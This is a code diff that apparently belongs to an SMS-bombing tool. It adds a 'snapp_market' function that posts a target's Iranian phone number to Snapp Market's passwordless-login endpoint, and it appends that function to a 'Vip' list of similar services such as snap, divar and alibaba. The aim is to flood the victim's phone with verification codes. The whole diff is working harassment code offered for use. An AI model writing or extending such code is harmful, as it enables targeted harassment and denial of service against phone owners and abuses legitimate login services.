@@ -154,6 +154,20 @@ def okorosh(phone):
         print(f"{r}[!] OfoghKourosh Exception: {e}")
         return False
 
+def snapp_market(phone):
+    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
+    params = {"cellphone": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, params=params, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Snapp Market) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Snapp Market Exception: {e}{a}')
+        return False
+
 # Wrapper to safely run each service
 def send_service_safe(service, phone):
     result = service(phone)
@@ -166,7 +180,7 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     snap, gap, divar, alibaba, mek, okorosh,
-    drnext, pindo, shahrfarsh, tetherland
+    drnext, pindo, shahrfarsh, tetherland, snapp_market
 ]
     total_services = len(services)
     
